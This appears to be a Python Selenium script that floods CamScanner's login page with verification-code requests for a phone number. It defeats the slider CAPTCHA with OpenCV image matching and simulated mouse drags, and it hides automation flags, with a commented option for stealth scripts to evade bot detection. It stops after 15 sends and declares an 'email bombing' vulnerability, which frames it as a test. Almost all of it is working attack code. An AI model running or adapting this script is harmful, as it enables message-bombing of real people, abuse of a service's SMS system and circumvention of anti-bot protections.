import configparser
import os
import urllib.request
import cv2
import numpy as np
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver import ActionChains
from bs4 import BeautifulSoup

DIR_PATH = os.path.dirname(os.path.abspath(__file__)) + "/img"
IMAGE_FILE_NAME = '{}{}{}{}'.format(DIR_PATH, os.sep, "image", ".jpg")
BLOCK_FILE_NAME = '{}{}{}{}'.format(DIR_PATH, os.sep, "block", ".jpg")
DRAG_SPEED = 18


def crawl():
    url = 'https://v4.camscanner.com/login'
    phone = '13888888888'
    base_dir = os.path.dirname(os.path.abspath(__file__))
    config = configparser.RawConfigParser()
    config.read(base_dir + "/config.ini", encoding="utf-8-sig")
    __CHROME_DRIVER_PATH__ = config.get("path", "chromedriver")
    __CHROME_BIN_PATH__ = config.get("path", "chromebin")
    options = Options()
    options.binary_location = __CHROME_BIN_PATH__
    options.add_argument('--no-sandbox')  # 解决DevToolsActivePort文件不存在的报错
    options.add_argument('window-size=2560x1600')  # 设置浏览器分辨率
    options.add_argument('--disable-gpu')  # 谷歌文档提到需要加上这个属性来规避bug
    options.add_argument('--disable-dev-shm-usage')  # 大量渲染时写入/tmp
    options.add_argument('--hide-scrollbars')  # 隐藏滚动条，应对一些特殊页面
    # options.add_argument('--headless')  # 浏览器不提供可视化界面。Linux下如果系统不支持可视化不加这条会启动失败
    options.add_experimental_option('excludeSwitches', ['enable-automation'])  # 去掉自动控制标志

    driver = webdriver.Chrome(options=options)
    # 防止网站对selenium检测
    # with open('./stealth.min.js', 'r') as f:
    #     js = f.read()
    # driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
    #     "source": js
    # })
    success_num = 0
    while True:
        driver.maximize_window()
        driver.implicitly_wait(10)  # seconds
        driver.get(url)

        code_login_element = driver.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[2]/div/div/div/div/div[3]/h1')
        code_login_element.click()
        sleep(1)

        phone_element = driver.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[2]/div/div/div/div/div[6]/div[2]/div/input')
        phone_element.send_keys(phone)

        get_code_element = driver.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[2]/div/div/div/div/div[6]/div[3]/button/span')
        get_code_element.click()
        sleep(1)
        if not elementIsExists(driver, By.XPATH, '/html/body/div[2]/div[2]/div[6]/div/div[1]/div[2]/div[2]'):
            success_num = success_num + 1
            print('发送成功：累计发送：' + str(success_num))
            if success_num >= 15:
                print("测试成功发送15条信息，存在邮箱轰炸漏洞！")
                break
            continue
        drag_start_element = driver.find_element(By.XPATH, '/html/body/div[2]/div[2]/div[6]/div/div[1]/div[2]/div[2]')
        background_element = driver.find_element(By.XPATH, '/html/body/div[2]/div[2]/div[6]/div/div[1]/div[1]/div/a/div[1]/div/canvas[2]')
        image_url = drag_start_element.get_attribute('src')
        block_url = background_element.get_attribute('src')
        save_verification_image(block_url, image_url)
        verify_slide_length = get_gap_left_offset(IMAGE_FILE_NAME, BLOCK_FILE_NAME)
        # 实现拖放
        move_drag_button(drag_start_element, driver, verify_slide_length)
        sleep(1)
        if not elementIsExists(driver, By.XPATH, '/html/body/div[2]/div[2]/div[6]/div/div[1]/div[2]/div[2]'):
            success_num = success_num + 1
            print('发送成功：累计发送：' + str(success_num))
            if success_num >= 15:
                print("测试成功发送15条信息，存在邮箱轰炸漏洞！")
                break
            continue









        sleep(600)
    # email_login_element = driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div/div[1]/div[2]')
    # email_login_element.click()
    # email_input_element = driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div/div[2]/span[1]/input')
    # email_input_element.send_keys(__USERNAME__)
    # password_input_element = driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div/div[2]/span[2]/input')
    # password_input_element.send_keys(__PASSWORD__)
    # login_element = driver.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div/button/span')
    # login_element.click()
    # sleep(5)
    #
    # temp_i = 0
    # while elementIsExists(driver, By.XPATH, '//*[@id="captcha_container"]/div'):
    #     temp_i = temp_i + 1
    #     if temp_i > 5:
    #         break
    #
    #     drag_start_element = driver.find_element(By.XPATH, '//*[@id="captcha_container"]/div/div[2]/img[2]')
    #     background_element = driver.find_element(By.XPATH, '//*[@id="captcha-verify-image"]')
    #     image_url = drag_start_element.get_attribute('src')
    #     block_url = background_element.get_attribute('src')
    #     save_verification_image(block_url, image_url)
    #     verify_slide_length = get_gap_left_offset(IMAGE_FILE_NAME, BLOCK_FILE_NAME)
    #     # 实现拖放
    #     move_drag_button(drag_start_element, driver, verify_slide_length)
    #     sleep(5)
    #
    # driver.get("https://www.csjplatform.com/union/media/union/download/detail?id=16&docId=5f327098d44dc5000e1d45d5&osType=ios")
    # sleep(5)
    #
    #
    # soup = BeautifulSoup(driver.page_source, 'lxml')
    # result = soup.find('code', class_='language-Objective-C').text
    #
    # if "<key>SKAdNetworkIdentifier</key>" not in result:
    #     return result_set
    #
    # # 去掉注解
    # result = result.replace('// SKAdNetwork方案的穿山甲SKAdNetwork id', '')
    # result_set[1] = result
    # result_set[2] = 1
    # driver.quit()
    # return result_set


def move_drag_button(button, web_driver, length):
    action = ActionChains(web_driver)
    # 点击鼠标并进行拖拽
    action.click_and_hold(button)
    last = length % DRAG_SPEED
    i = DRAG_SPEED
    while i < length:
        action.move_by_offset(DRAG_SPEED, 0)
        i += DRAG_SPEED
    if last != 0:
        action.move_by_offset(last, 0)
    # time.sleep(0.5)
    action.release()
    action.perform()


def save_verification_image(block_url, image_url):
    try:
        if not os.path.exists(DIR_PATH):
            os.makedirs(DIR_PATH)
        urllib.request.urlretrieve(image_url, filename=IMAGE_FILE_NAME)
        urllib.request.urlretrieve(block_url, filename=BLOCK_FILE_NAME)
    except IOError:
        print("IOError")


def get_gap_left_offset(image_url, block_url):
    """
    识别图像并获取缺口距离图片左边的像素距离

    :param image_url: 完整图片 URL
    :param block_url: 缺口图片 URL
    :return:
    """
    # 读入图像
    image = cv2.imread(image_url, 0)
    block = cv2.imread(block_url, 0)
    temp_image = './verification/oceanengine/temp_image.jpg'
    temp_block = './verification/oceanengine/temp_block.jpg'
    # # 保存图像
    cv2.imwrite(temp_image, image)
    cv2.imwrite(temp_block, block)
    block = cv2.imread(temp_block)
    # 色彩转灰色
    block = cv2.cvtColor(block, cv2.COLOR_BGR2GRAY)
    block = abs(255 - block)
    cv2.imwrite(temp_block, block)
    block = cv2.imread(temp_block)
    image = cv2.imread(temp_image)
    result = cv2.matchTemplate(block, image, cv2.TM_CCOEFF_NORMED)
    offset_top, offset_left = np.unravel_index(result.argmax(), result.shape)
    return offset_left / 1.62


def elementIsExists(driver, by, value):
    try:
        element = driver.find_element(by, value)
    except Exception:
        return False
    else:
        return True


if __name__ == '__main__':
    crawl()
